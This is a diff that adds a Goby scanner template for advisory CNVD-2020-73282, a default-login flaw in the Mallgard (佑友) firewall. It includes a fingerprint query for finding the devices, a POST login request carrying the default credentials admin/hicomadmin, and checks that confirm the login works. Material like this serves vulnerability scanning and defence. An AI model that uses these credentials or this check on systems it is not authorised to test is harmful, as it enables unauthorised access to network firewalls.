@@ -1,0 +1,61 @@
+{
+      "Name": "Mallgard Firewall Default Login CNVD-2020-73282",
+      "Level": "1",
+      "Tags": [
+            "defaultaccount"
+      ],
+      "GobyQuery": "app=\"佑友-佑友防火墙\"",
+      "Description": "Mallgard Firewall",
+      "Product": "Mallgard Firewall",
+      "Homepage": "http://www.hechen.com/",
+      "Author": "",
+      "Impact": "Mallgard Firewall Default Login (admin/hicomadmin).",
+      "Recommendation": "",
+      "References": [
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2020-73282"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/index.php?c=user&a=ajax_save",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-type": "text/html; charset=utf-8"
+                        },
+                        "data_type": "text",
+                        "data": "username=admin&password=hicomadmin&language=zh-cn"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "message",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
